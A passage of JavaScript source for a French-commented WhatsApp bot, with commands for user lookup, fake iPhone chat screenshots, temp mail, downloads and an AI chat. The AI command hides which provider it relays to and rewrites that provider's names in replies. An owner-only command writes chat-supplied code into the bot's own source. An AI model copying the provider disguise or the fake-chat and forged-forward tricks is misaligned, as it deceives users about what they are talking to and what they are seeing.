*│ ◈ ${prefix}ᴛᴇᴍᴘᴍᴀɪʟ*
*│ ◈ ${prefix}ᴄʜᴇᴄᴋᴍᴀɪʟ*
*│ ◈ ${prefix}ᴄᴄɢᴇɴ*
*│ ◈ ${prefix}ᴄʜᴀɪɴғᴏ*
*│ ◈ ${prefix}ʀᴇᴍᴏᴠᴇʙɢ*
*│ ◈ ${prefix}ssᴡᴇʙ*
*│ ◈ ${prefix}ᴄᴏᴜᴘʟᴇᴘᴘ*
*│ ◈ ${prefix}ǫᴜᴏᴛᴇ*
*│ ◈ ${prefix}ᴛᴏᴠɪᴇᴡᴏɴᴄᴇ*
*│ ◈ ${prefix}ᴄʟᴏɴᴇᴡᴇʙ*
*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*

*╭┄┄☯ ᴅᴏᴡɴʟᴏᴀᴅ ◆*
*│ ◈ ${prefix}ɪᴍɢ*
*│ ◈ ${prefix}ᴘɪɴ*
*│ ◈ ${prefix}ᴛɪᴋᴛᴏᴋ*
*│ ◈ ${prefix}ᴘʟᴀʏ*
*│ ◈ ${prefix}ʏᴛᴍᴘ4*
*│ ◈ ${prefix}ᴍᴇᴅɪᴀғɪʀᴇ*
*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*

*╭┄┄☯ ғᴜɴ ◆*
*│ ◈ ${prefix}ɪᴘʜᴏɴᴇ*
*│ ◈ ${prefix}ᴘᴘᴄ*
*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*

*╭┄┄☯ ᴀɪ ◆*
*│ ◈ ${prefix}Gideonᴀɪ*
*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*
`;

 // --- CONFIGURATION FAKE QUOTED SPIDER XD ---
 const fakeSpider = {
 key: {
 remoteJid: '0@s.whatsapp.net',
 fromMe: false,
 id: 'GIDEON_MD_STYLISH',
 participant: '0@s.whatsapp.net'
 },
 message: {
 // Utilisation de Small Caps pour le texte cité
 conversation: "Gideon-ᴍᴅ ᴏᴘᴛɪᴍɪᴢᴇᴅ ʙʏ Cobra ᴛᴇᴄʜ 🐍"
 }
 };

 await sock.sendMessage(gaara.chat, {
 image: buffer,
 caption: con,
 contextInfo: {
 participant: '0@s.whatsapp.net',
 remoteJid: 'status@broadcast',
 forwardingScore: 999,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363404137900781@newsletter',
 newsletterName: '𝐆𝐈𝐃𝐄𝐎𝐍 𝐌𝐃 𝐁𝐎𝐓',
 serverMessageId: 125
 },
 externalAdReply: {
 title: "Gideon ᴍᴅ ᴀssɪsᴛᴀɴᴛ",
 body: "ᴀᴜᴛᴏᴍᴀᴛᴇᴅ ʙᴏᴛ ʙʏ Cobra",
 thumbnail: buffer,
 sourceUrl: "https://whatsapp.com/channel/0029Vb7EpGwBlHpXKNgFET1Z",
 mediaType: 1,
 renderLargerThumbnail: false
 }
 }
 }, { quoted: fakeSpider });

 } catch (e) {
 console.error(e);
 gaara.reply("Une erreur est survenue.");
 }
}
break;


case 'whois':
case 'profile':
case 'userinfo': {
 try {
 await gaara.react("👤");

 // 1. DÉTERMINER LA CIBLE (Mention, Réponse ou Soi-même)
 let userJid;
 if (m.mentionedJid?.length) {
 userJid = m.mentionedJid[0];
 } else if (m.quoted && m.quoted.sender) {
 userJid = m.quoted.sender;
 } else {
 userJid = m.sender;
 }

 // 2. VÉRIFIER L'EXISTENCE SUR WHATSAPP
 const [user] = await sock.onWhatsApp(userJid).catch(() => []);
 if (!user?.exists) return gaara.reply(toSmallCaps("user not found on whatsapp"));

 // 3. RÉCUPÉRER LA PHOTO DE PROFIL
 let ppUrl;
 try {
 ppUrl = await sock.profilePictureUrl(userJid, 'image');
 } catch {
 ppUrl = 'https://i.ibb.co/KhYC4FY/1221bc0bdd2354b42b293317ff2adbcf-icon.png'; // Image par défaut
 }

 // 4. RÉCUPÉRER LE NOM (PUSHNAME)
 let userName = userJid.split('@')[0];
 try {
 const contact = await sock.fetchStatus(userJid).catch(() => null);
 // On tente de récupérer le nom via les métadonnées de groupe si possible
 if (isGroup) {
 const groupMetadata = await sock.groupMetadata(m.chat);
 const participant = groupMetadata.participants.find(p => p.id === userJid);
 if (participant) userName = participant.id.split('@')[0];
 }
 } catch (e) { console.log(e) }

 // 5. RÉCUPÉRER LA BIO / STATUS
 let bioText = "No bio available";
 try {
 const statusData = await sock.fetchStatus(userJid).catch(() => null);
 if (statusData?.status) bioText = statusData.status;
 } catch (e) { console.log(e) }

 // 6. RÔLE DANS LE GROUPE
 let groupRole = "";
 if (isGroup) {
 const groupMetadata = await sock.groupMetadata(m.chat);
 const participant = groupMetadata.participants.find(p => p.id === userJid);
 groupRole = participant?.admin ? "👑 Admin" : "👥 Member";
 }

 // 7. FORMATAGE DU MESSAGE (SPIDER XD DESIGN)
 const userInfo = `*╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*
*│ 🌟 𝐆𝐈𝐃𝐄𝐎𝐍 𝐌𝐃 𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*
*│* 👤 *${toSmallCaps("name")}:* @${userJid.split('@')[0]}
*│* 🔢 *${toSmallCaps("number")}:* ${userJid.split('@')[0]}
*│* 📌 *${toSmallCaps("type")}:* ${user.isBusiness ? "💼 Business" : "👤 Personal"}
${isGroup ? `*│* 🛡️ *${toSmallCaps("group role")}:* ${groupRole}` : ''}
*│* 📝 *${toSmallCaps("about")}:*
*│* ${bioText}
*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*`;

 // 8. ENVOI DU MESSAGE AVEC PHOTO
 await sock.sendMessage(m.chat, {
 image: { url: ppUrl },
 caption: userInfo,
 mentions: [userJid]
 }, { quoted: m });

 } catch (e) {
 console.error("Whois error:", e);
 gaara.reply(toSmallCaps("failed to fetch user info"));
 }
}
break;


case 'iphonequote':
case 'fakechat':
case 'iphone': {
 try {
 // Réaction avec le téléphone
 await gaara.react("📱");

 const text = m.body.slice(prefix.length + command.length).trim();
 
 if (!text) {
 return gaara.reply(`❌ *${toSmallCaps("example")}:*\n${prefix + command} Hello GIDEON md`);
 }

 // URL de l'API avec les paramètres (Heure fixe et Batterie 100%)
 const apiUrl = `https://www.veloria.my.id/imagecreator/fake-chat?time=12:00&messageText=${encodeURIComponent(text)}&batteryPercentage=100`;

 // Envoi de l'image générée
 await sock.sendMessage(m.chat, {
 image: { url: apiUrl },
 caption: `*╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*\n*│* 🪭 *ʙᴏᴛ ɴᴀᴍᴇ Gideon ᴍᴅ*\n│👦🏻 *ʙʏ Cobra ᴛᴇᴄʜ*\n*│* 📱 *${toSmallCaps("iphone fake chat")}\n*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*`
 }, { quoted: m });

 } catch (e) {
 console.error("IphoneQuote Error:", e);
 gaara.reply(toSmallCaps("failed to generate iphone quote"));
 }
}
break;


case 'newgc':
case 'creategroup': {
 // Vérification Propriétaire
 if (!isOwner) return gaara.reply(toSmallCaps("owner only"));

 const groupName = args.join(" ");
 if (!groupName) return gaara.reply(`*${toSmallCaps("usage")}:* ${prefix + command} Nom du Groupe`);

 try {
 await gaara.react("🏗️");

 // Création du groupe (avec le créateur uniquement au début)
 const cret = await sock.groupCreate(groupName, []);
 
 // Génération du lien d'invitation
 const code = await sock.groupInviteCode(cret.id);
 const link = `https://chat.whatsapp.com/${code}`;

 // Formatage de la date (Heure d'Haïti comme dans ta config)
 const creationTime = new Date(cret.creation * 1000).toLocaleString('fr-FR', { 
 timeZone: 'America/Port-au-Prince',
 dateStyle: 'short',
 timeStyle: 'medium'
 });

 const teks = `*╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*
*│ 🍂 𝐆𝐈𝐃𝐄𝐎𝐍 𝐌𝐃 𝐆𝐑𝐎𝐔𝐏 𝐂𝐑𝐄𝐀𝐓𝐄𝐃*
*│* 📛 *${toSmallCaps("name")}:* ${cret.subject}
*│* 🔢 *${toSmallCaps("group id")}:* ${cret.id}
*│* 👑 *${toSmallCaps("owner")}:* @${cret.owner.split("@")[0]}
*│* 📅 *${toSmallCaps("created")}:* ${creationTime}
*│* 🔗 *${toSmallCaps("invite link")}:* 
*│* ${link}
*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*
> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ Cobra ᴛᴇᴄʜ*`;

 await sock.sendMessage(m.chat, {
 text: teks,
 mentions: [cret.owner]
 }, { quoted: m });

 } catch (e) {
 console.error("NewGC Error:", e);
 gaara.reply(toSmallCaps("failed to create group. check bot permissions."));
 }
}
break;





case 'repo': {
 try {
 await gaara.react("📂");

 const repoMsg = `🍂 *${toSmallCaps("GIDEON md repository")}*

*╭┄┄☯ ${toSmallCaps("project details")} ◆*
*│ ◈ ${toSmallCaps("name")} : GIDEON md*
*│ ◈ ${toSmallCaps("author")} : Cobra Tech*
*│ ◈ ${toSmallCaps("status")} : Running*
*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*︎

> *${toSmallCaps("get the latest version and documentation on our official website below")}* ⚡`;

 await sock.relayMessage(gaara.chat, {
 viewOnceMessage: {
 message: {
 interactiveMessage: {
 header: {
 title: `*${toSmallCaps("official repository")}*`,
 hasMediaAttachment: false
 },
 body: { text: repoMsg },
 footer: { text: "Gideon ᴍᴅ ᴏᴘᴛɪᴍɪᴢᴇᴅ ʙʏ Cobra ᴛᴇᴄʜ" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: JSON.stringify({
 display_text: toSmallCaps("open GIDEON md web"),
 url: "https://X-trem-cfd4a4acd17c.herokuapp.com"
 })
 }
 ]
 },
 contextInfo: {
 forwardingScore: 999,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363404137900781@newsletter',
 newsletterName: '𝐆𝐈𝐃𝐄𝐎𝐍 𝐌𝐃 𝐁𝐎𝐓',
 serverMessageId: 125
 }
 }
 }
 }
 }
 }, { quoted: mquote });

 } catch (e) {
 console.error("Repo Command Error:", e);
 gaara.reply("https://X-trem-cfd4a4acd17c.herokuapp.com");
 }
}
break;

















case 'ppc': {
 const choices = ['pierre', 'papier', 'ciseaux'];
 // On récupère le choix de l'utilisateur via la variable "text" que tu as définie
 const userChoice = text ? text.toLowerCase().trim() : null;

 if (!userChoice || !choices.includes(userChoice)) {
 return m.reply(`🎮 *PPC HARDCORE* 🎮\n\nChoisis bien ton arme : pierre, papier ou ciseaux.\nExemple: *${prefix}ppc pierre*`);
 }

 // --- LOGIQUE IA AVANCÉE ---
 // Au lieu d'un random pur (33%), on donne 50% de chance au bot de "tricher"
 // ou d'anticiper le mouvement le plus commun.
 let botChoice;
 const cheatChance = Math.random();

 if (cheatChance > 0.7) { 
 // Le bot "anticipe" et choisit l'élément qui bat le tien
 if (userChoice === 'pierre') botChoice = 'papier';
 else if (userChoice === 'papier') botChoice = 'ciseaux';
 else botChoice = 'pierre';
 } else {
 // Le bot joue normalement
 botChoice = choices[Math.floor(Math.random() * 3)];
 }

 await sock.sendMessage(m.chat, { react: { text: "🧠", key: m.key } });

 let result = "";
 let finalEmoji = "";

 if (userChoice === botChoice) {
 result = "👔 *ÉGALITÉ !* Tu as eu de la chance, j'ai lu dans tes pensées...";
 finalEmoji = "🤝";
 } else if (
 (userChoice === 'pierre' && botChoice === 'ciseaux') ||
 (userChoice === 'papier' && botChoice === 'pierre') ||
 (userChoice === 'ciseaux' && botChoice === 'papier')
 ) {
 result = "🥳 *TU AS GAGNÉ !* Impossible... tu as hacké mon processeur ?";
 finalEmoji = "🔥";
 } else {
 result = "💀 *J'AI GAGNÉ !* L'intelligence artificielle est supérieure. Humain prévisible.";
 finalEmoji = "🎯";
 }

 const response = `🕹️ *MODE DIFFICILE* 🕹️\n\n` +
 `👤 *Toi:* ${userChoice}\n` +
 `🤖 *GIDEON AI:* ${botChoice}\n\n` +
 `────────────────\n` +
 `${result} ${finalEmoji}\n` +
 `────────────────\n` +
 `> Tu veux une revanche ?`;

 m.reply(response);
}
break;






















case 'tttend':
case 'delttt': {
 if (global.ttt && global.ttt[m.chat]) {
 delete global.ttt[m.chat];
 m.reply("🛑 Partie de Morpion annulée.");
 } else {
 m.reply("❌ Aucune partie en cours.");
 }
}
break;







case 'sticker':
case 's':
case 'vs': {
 try {
 // On importe le constructeur de sticker
 const stickerBuilder = require('./lib/sticker.js'); 
 
 const q = m.quoted ? m.quoted : m;
 const mime = (q.msg || q).mimetype || '';
 
 if (!/image|video|gif/.test(mime)) {
 return m.reply(toSmallCaps("please reply to an image or video."));
 }

 await sock.sendMessage(m.chat, { react: { text: "🎨", key: m.key } });

 const media = await q.download();
 const type = mime.split('/')[0]; 

 // Appel de la fonction toSticker
 const buffer = await stickerBuilder.toSticker(type, media, {
 packname: "𝚂𝚃𝙰𝚁 GIDEON",
 author: "GIDEON 𝚃𝙴𝙲𝙷𝚆𝙼𝚇"
 });

 await sock.sendMessage(m.chat, { sticker: buffer }, { quoted: m });
 await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

 } catch (e) {
 console.error('Sticker Error:', e);
 m.reply(toSmallCaps("error: failed to convert sticker."));
 }
}
break;
















case 'GIDEONai':
case 'ai': {
 try {
 const axios = require('axios');
 if (!text) return m.reply(`*Gideon ᴀɪ* 🐍\n\nʜᴇʟʟᴏ! ɪ ᴀᴍ Gideon ᴀɪ, ᴄʀᴇᴀᴛᴇᴅ ʙʏ *Cobra ᴛᴇᴄʜ*. ʜᴏᴡ ᴄᴀɴ ɪ ᴀssɪsᴛ ʏᴏᴜ ᴛᴏᴅᴀʏ?`);

 // Visual reaction while processing
 await sock.sendMessage(m.chat, { react: { text: "🔍", key: m.key } });

 // System Prompt: English Instructions for Identity & Behavior
 const systemPrompt = `ʏᴏᴜʀ ɴᴀᴍᴇ ɪs Gideon ᴀɪ. ʏᴏᴜʀ ᴄʀᴇᴀᴛᴏʀ ɪs Cobra ᴛᴇᴄʜ. 
 ʏᴏᴜ ᴀʀᴇ ᴀ ʜɪɢʜʟʏ ɪɴᴛᴇʟʟɪɢᴇɴᴛ ᴀɴᴅ ʜᴇʟᴘғᴜʟ ᴀssɪsᴛᴀɴᴛ. 
 ᴀʟᴡᴀʏs ʀᴇsᴘᴏɴᴅ ɪɴ ᴛʜᴇ sᴀᴍᴇ ʟᴀɴɢᴜᴀɢᴇ ᴛʜᴇ ᴜsᴇʀ sᴘᴇᴀᴋs. 
 ɴᴇᴠᴇʀ ᴍᴇɴᴛɪᴏɴ ᴊᴇᴇᴠᴇs ᴏʀ ғᴀᴀ. ɪғ ᴀsᴋᴇᴅ ᴡʜᴏ ʏᴏᴜ ᴀʀᴇ, sᴀʏ ʏᴏᴜ ᴀʀᴇ ʏᴏᴜ ᴀɪ, ᴀɴ ᴀᴜᴛᴏᴍᴀᴛᴇᴅ ʙᴏᴛ ʙʏ Cobra ᴛᴇᴄʜ.`;
 
 const fullPrompt = `${systemPrompt}\n\nUser Question: ${text}`;
 
 // Correct parameter 'prompt' for the API
 const apiUrl = `https://api-faa.my.id/faa/jeeves-ai?prompt=${encodeURIComponent(fullPrompt)}`;

 const response = await axios.get(apiUrl);
 const res = response.data;

 if (res.status && res.result) {
 // Clean the response from any traces of the original API name
 let finalReply = res.result
 .replace(/Jeeves AI/gi, "GIDEON AI")
 .replace(/Faa/gi, "Cobra Tech");

 await sock.sendMessage(m.chat, { 
 text: `*Gideon ᴀɪ* 🐍\n\n${finalReply}\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ Cobra ᴛᴇᴄʜ*`,
 contextInfo: {
 externalAdReply: {
 title: "Gideon ᴀɪ ᴄᴏɴᴠᴇʀsᴀᴛɪᴏɴ",
 body: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ Cobra ᴛᴇᴄʜ",
 thumbnailUrl: "https://files.catbox.moe/j7vvf8.jpg",
 sourceUrl: "https://whatsapp.com/channel/0029Vb7EpGwBlHpXKNgFET1Z",
 mediaType: 1,
 renderLargerThumbnail: false
 }
 }
 }, { quoted: m });
 
 await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
 } else {
 m.reply("The AI server returned an empty response. Please try again later.");
 }

 } catch (e) {
 console.error('AI Error:', e);
 // Error handling for Bad Request (usually text too long)
 m.reply("Error connecting to GIDEON AI. Try asking a shorter question.");
 }
}
break;


case 'GIDEON':



case 'GIDEONai':



case 'config': {
 try {
 const botId = botNumber.split('@')[0];
 const config = sessionsConfig[botId];

 if (!config) return gaara.reply(`❌ *${toSmallCaps("configuration not found")}*`);

 await gaara.react("⚙️");

 // Construction du message avec ton style de menu
 const configMsg = `*╭┄┄☯ ꜱʏꜱᴛᴇᴍ ᴄᴏɴꜰɪɢ ◆*
*│ ◈ ᴘʀᴇꜰɪx:* ${config.prefix}
*│ ◈ ᴍᴏᴅᴇ:* ${config.mode}
*│ ◈ ᴡᴇʟᴄᴏᴍᴇ:* ${config.welcome}
*│ ◈ ᴀᴜᴛᴏ ᴛʏᴘɪɴɢ:* ${config.autotyping}
*│ ◈ ᴀᴜᴛᴏ ʀᴇᴄᴏʀᴅ:* ${config.autorecording}
*│ ◈ ᴀɴᴛɪ-ᴄᴀʟʟ:* ${config.anticall}
*│ ◈ ᴀᴜᴛᴏ ʀᴇᴀᴄᴛ:* ${config.autoreact}
*│ ◈ ᴀᴅᴍɪɴ ᴇᴠᴇɴᴛꜱ:* ${config.adminevents}
*│ ◈ ᴍᴀx ᴛʀɪᴇꜱ:* ${config.maxtries}
*│ ◈ ᴀᴜᴛᴏ ʟɪᴋᴇ ꜱᴛᴀᴛᴜꜱ:* ${config.autolikestatus}
*│ ◈ ꜱᴛᴀᴛᴜꜱ ᴠɪᴇᴡ:* ${config.statusview}
*│ ${toSmallCaps("status emojis")}*
*│* ${config.likestatuemoji.join(' ')}
*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*︎

> ${toSmallCaps("Gideon md system settings")}`;

 // Envoi simple avec ContextInfo (le carré d'info)
 await sock.sendMessage(gaara.chat, { 
 text: configMsg,
 contextInfo: {
 externalAdReply: {
 title: "ꜱʏꜱᴛᴇᴍ ᴘᴀɴᴇʟ ᴠ1.0",
 body: `ᴄᴜʀʀᴇɴᴛ ᴍᴏᴅᴇ: ${config.mode.toUpperCase()}`,
 thumbnailUrl: "https://files.catbox.moe/06ufyi.jpg", 
 sourceUrl: "https://whatsapp.com/channel/0029Vb7EpGwBlHpXKNgFET1Z",
 mediaType: 1,
 renderLargerThumbnail: false
 }
 }
 }, { quoted: mquote });

 await gaara.react("✅");

 } catch (e) {
 console.error('Config Error:', e);
 gaara.reply(`❌ *${toSmallCaps("error fetching configuration")}*`);
 }
}
break;











case 'checkmail':
case 'inbox': {
 try {
 const axios = require('axios');

 if (!text) return gaara.reply(`📌 *${toSmallCaps("usage")} :* ${prefix}checkmail [session_id]`);

 await gaara.react("📥");

 // 1. Appel à l'API Inbox
 const apiUrl = `https://apis.davidcyril.name.ng/temp-mail/inbox?id=${text}`;
 const response = await axios.get(apiUrl);
 const res = response.data;

 // 2. Vérification si la boîte est vide
 if (!res.success || !res.messages || res.messages.length === 0) {
 await gaara.react("❌");
 return gaara.reply(`📭 *${toSmallCaps("no messages found in this inbox")}*`);
 }

 // 3. Construction du corps du message
 let inboxMsg = `*╭┄┄☯ ᴛᴇᴍᴘ ᴍᴀɪʟ ɪɴʙᴏ𝕩 ◆* \n`;
 inboxMsg += `*│ ◈ ᴛᴏᴛᴀʟ :* ${res.inbox_count}\n`;
 inboxMsg += `*│ ◈ Gideon ᴍᴅ ʙᴏᴛ*\n`;

 const buttons = [];

 // 4. Boucle pour traiter chaque message (limité aux 5 derniers pour la stabilité)
 res.messages.slice(0, 5).forEach((msg, index) => {
 const num = index + 1;
 inboxMsg += `*│* *${num}. ꜰʀᴏᴍ:* ${msg.fromAddr}\n`;
 inboxMsg += `*│* *📝 ᴍsɢ:* ${msg.text.trim()}\n`;
 inboxMsg += `*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*\n`;

 // Ajout dynamique d'un bouton de copie pour chaque message
 buttons.push({
 name: "cta_copy",
 buttonParamsJson: JSON.stringify({
 display_text: `📋 ${toSmallCaps("copy msg")} ${num}`,
 id: `copy_msg_${num}`,
 copy_code: msg.text.trim()
 })
 });
 });

 // 5. Envoi du message interactif
 await sock.relayMessage(gaara.chat, {
 viewOnceMessage: {
 message: {
 interactiveMessage: {
 header: { 
 title: `📩 *${toSmallCaps("inbox reader")}*`,
 hasMediaAttachment: false 
 },
 body: { text: inboxMsg },
 footer: { text: "Gideon ᴍᴅ ᴏᴘᴛɪᴍɪᴢᴇᴅ ʙʏ Cobra ᴛᴇᴄʜ" },
 nativeFlowMessage: {
 buttons: buttons
 },
 contextInfo: {
 mentionedJid: [m.sender],
 forwardingScore: 999,
 isForwarded: true,
 externalAdReply: {
 title: "ᴛᴇᴍᴘ ᴍᴀɪʟ ɪɴʙᴏ𝕩",
 body: `${res.inbox_count} ${toSmallCaps("messages received")}`,
 thumbnailUrl: "https://i.ibb.co/L6r0q8p/temp-mail.png",
 sourceUrl: "https://apis.davidcyril.name.ng",
 mediaType: 1,
 renderLargerThumbnail: false
 }
 }
 }
 }
 }
 }, { quoted: m });

 await gaara.react("✅");

 } catch (e) {
 console.error('CheckMail Error:', e);
 gaara.reply(`❌ *${toSmallCaps("error")} :* ${toSmallCaps("check session id")}`);
 }
}
break;


case 'tempmail': {
    try {
        const axios = require('axios');

        await gaara.react("📧");

        // 1. Appel à l'API
        const apiUrl = `https://apis.davidcyril.name.ng/temp-mail`;
        const response = await axios.get(apiUrl);
        const res = response.data;

        if (!res.success) {
            return gaara.reply(`❌ *${toSmallCaps("error")} :* ${toSmallCaps("failed to generate temp mail")}`);
        }

        const expiryDate = new Date(res.expires_at).toLocaleString();

        // 2. Le message style Menu
        const mailMsg = `*╭┄┄☯ ᴛᴇᴍᴘ ᴍᴀɪʟ ◆*
*│ ◈ ᴇᴍᴀɪʟ:* ${res.email}
*│ ◈ ɪᴅ:* \`${res.session_id}\`
*│ ◈ ᴇxᴘɪʀᴇ:* ${expiryDate}
*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*

> ${toSmallCaps("click the button below to copy the session id")}`;

        // 3. Construction du message interactif avec ContextInfo Forcé
        const messageToRelay = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: { 
                            title: `*${toSmallCaps("temporary email")}*`,
                            hasMediaAttachment: false 
                        },
                        body: { text: mailMsg },
                        footer: { text: "Gideon ᴍᴅ ᴏᴘᴛɪᴍɪᴢᴇᴅ ʙʏ Cobra ᴛᴇᴄʜ" },
                        nativeFlowMessage: {
                            buttons: [{
                                name: "cta_copy",
                                buttonParamsJson: JSON.stringify({
                                    display_text: `📋 ${toSmallCaps("copy session id")}`,
                                    id: "copy_mail_id",
                                    copy_code: res.session_id
                                })
                            }]
                        },
                        // ContextInfo placé ici pour la visibilité
                        contextInfo: {
                            mentionedJid: [m.sender],
                            forwardingScore: 999,
                            isForwarded: true,
                            externalAdReply: {
                                title: "ᴛᴇᴍᴘᴏʀᴀʀʏ ᴇᴍᴀɪʟ ɢᴇɴᴇʀᴀᴛᴏʀ",
                                body: "Cobraᴛᴇᴄʜ ᴅᴇʟɪᴠᴇʀʏ",
                                thumbnail: null, // Si tu as un buffer d'image, mets-le ici
                                thumbnailUrl: "https://i.ibb.co/L6r0q8p/temp-mail.png", 
                                sourceUrl: "https://apis.davidcyril.name.ng",
                                mediaType: 1,
                                renderLargerThumbnail: false
                            }
                        }
                    }
                }
            }
        };

        // 4. Envoi
        await sock.relayMessage(gaara.chat, messageToRelay, { quoted: m });

        await gaara.react("✅");

    } catch (e) {
        console.error('TempMail Error:', e);
        gaara.reply(`❌ *${toSmallCaps("an error occurred")}*`);
    }
}
break;


case 'mediafire':
case 'mf': {
 try {
 const axios = require('axios');

 // 1. Vérification de l'URL
 if (!text) return gaara.reply(`📌 *${toSmallCaps("usage")} :* ${prefix}mediafire [lien mediafire]`);
 
 if (!text.includes('mediafire.com/file')) {
 return gaara.reply(`❌ *${toSmallCaps("invalid mediafire link")}*`);
 }

 await gaara.react("⏳");

 // 2. Appel à l'API de David Cyril
 const apiUrl = `https://apis.davidcyril.name.ng/mediafire?url=${encodeURIComponent(text)}&apikey=votre_cle_ici`;
 const response = await axios.get(apiUrl);
 const res = response.data;

 if (!res.downloadLink) {
 return gaara.reply(`❌ *${toSmallCaps("error")} :* ${toSmallCaps("could not fetch file details")}`);
 }

 // 3. Message d'information sur le fichier
 const infoMsg = `*${toSmallCaps("mediafire downloader")}*
╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤
│📝 *${toSmallCaps("file name")} :* ${res.fileName}
│📦 *${toSmallCaps("size")} :* ${res.size}
│📄 *${toSmallCaps("type")} :* ${res.mimeType}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤
> ${toSmallCaps("uploading file, please wait")}... 🚀`;

 await gaara.reply(infoMsg);
 await gaara.react("📥");

 // 4. Envoi du fichier en tant que document
 await sock.sendMessage(gaara.chat, { 
 document: { url: res.downloadLink }, 
 fileName: res.fileName, 
 mimetype: res.mimeType 
 }, { quoted: mquote });

 await gaara.react("✅");

 } catch (e) {
 console.error('Mediafire Error:', e);
 gaara.reply(`❌ *${toSmallCaps("an error occurred")}* : ${toSmallCaps("file too large or api error")}`);
 }
}
break;








case 'delcase': {
    try {
        if (!isOwner) return gaara.reply(toSmallCaps("owner only bro"));
	const q = text || (gaara.quoted && gaara.quoted.text);
        if (!q) return gaara.reply(`*${toSmallCaps("usage")} :* ${prefix}delcase [nom_de_la_case]`);

      
  const fs = require('fs');

        const path = './spider.js';

        if (!fs.existsSync(path)) return gaara.reply("❌ Fichier spider.js introuvable.");

        let content = fs.readFileSync(path, 'utf8');

        // Regex pour trouver la case : 
        // Cherche "case 'nom':" jusqu'au premier "break;" inclus
        // Le flag 's' permet au point (.) de matcher aussi les retours à la ligne
        const caseRegex = new RegExp(`case\\s+['"]${q}['"]:[\\s\\S]*?break;`, 'g');

        if (!caseRegex.test(content)) {
            return gaara.reply(`❌ La case "${q}" n'a pas été trouvée.`);
        }

        // Suppression de la case
        const updatedContent = content.replace(caseRegex, '');

        fs.writeFileSync(path, updatedContent, 'utf8');

        // Notification avec hidetag
        
        await sock.sendMessage(gaara.chat, { 
            text: `✅ Case "${q}" supprimée ! Redémarrage en cours...`, 
        });

        // Délai avant fermeture
        await new Promise(resolve => setTimeout(resolve, 1000));
        process.exit();

    } catch (e) {
        console.error(e);
        gaara.reply("❌ Erreur lors de la suppression.");
    }
}
break;
case 'addcase': {
    try {
        if (!isOwner) return gaara.reply(toSmallCaps("owner only bro"));
      const q = text || (gaara.quoted && gaara.quoted.text);
	  if (!q) return gaara.reply(`*${toSmallCaps("usage")} :* ${prefix}addcase [le contenu de la case]`);

        const fs = require('fs');
        const path = './spider.js'; 

        if (!fs.existsSync(path)) return gaara.reply("❌ Fichier spider.js introuvable.");

        let content = fs.readFileSync(path, 'utf8');

        // On cherche le switch principal
        const switchPattern = /switch\s*\(([^)]+)\)\s*\{/;
        const match = content.match(switchPattern);

        if (!match) return gaara.reply("❌ Impossible de trouver le switch principal.");

        const insertPosition = match.index + match[0].length;
        const newCase = `\n\n${q}\n`;

        // Insertion du code
        const updatedContent = content.slice(0, insertPosition) + newCase + content.slice(insertPosition);

        fs.writeFileSync(path, updatedContent, 'utf8');

        // Notification avec hidetag pour confirmer aux admins/membres
        
        await sock.sendMessage(gaara.chat, { 
            text: "✅ Case ajoutée ! Redémarrage automatique du bot...", 
        });

        // Attendre 1 seconde pour être sûr que le message est envoyé avant de couper
        await new Promise(resolve => setTimeout(resolve, 1000));

        // Commande pour arrêter le processus (PM2 ou Nodemon le relancera)
        process.exit();

    } catch (e) {
        console.error(e);
        gaara.reply("❌ Erreur lors de l'ajout ou du redémarrage.");
    }
}
break;


case 'pinterest':
case 'pin': {
    try {
        const axios = require('axios');

        if (!text) return gaara.reply(`📌 *${toSmallCaps("usage")} :* ${prefix}pinterest cat`);

        await gaara.react("🔍");

        // 1. Appel à l'API Pinterest de David Cyril
        const apiUrl = `https://apis.davidcyril.name.ng/search/pinterest?text=${encodeURIComponent(text)}&apikey=votre_cle_ici`;
        const response = await axios.get(apiUrl);
        const res = response.data;

        // Vérification du succès et de la présence de résultats
        if (!res.success || !res.result || res.result.length === 0) {
            return gaara.reply(`❌ *${toSmallCaps("no results found")}*`);
        }

        // 2. Sélection du premier résultat (index 0)
        const pin = res.result[0];

        // 3. Préparation du message
        const caption = `*${toSmallCaps("pinterest search")}*
╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤
│📝 *${toSmallCaps("caption")} :* ${pin.caption.trim() || toSmallCaps("no caption")}
│👤 *${toSmallCaps("uploader")} :* ${pin.fullName} (@${pin.uploader})
│👥 *${toSmallCaps("followers")} :* ${pin.followers}
│🔗 *${toSmallCaps("source")} :* ${pin.source}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤
> ${toSmallCaps("result 1 of")} ${res.result.length}`;

        // 4. Envoi de l'image
        await sock.sendMessage(gaara.chat, { 
            image: { url: pin.image }, 
            caption: caption 
        }, { quoted: mquote });

        await gaara.react("✅");

    } catch (e) {
        console.error('Pinterest Error:', e);
        gaara.reply(`❌ *${toSmallCaps("error")} :* ${toSmallCaps("failed to fetch images")}`);
    }
}
break;

case 'ytmp4':
case 'video': {
    try {
        const axios = require('axios');

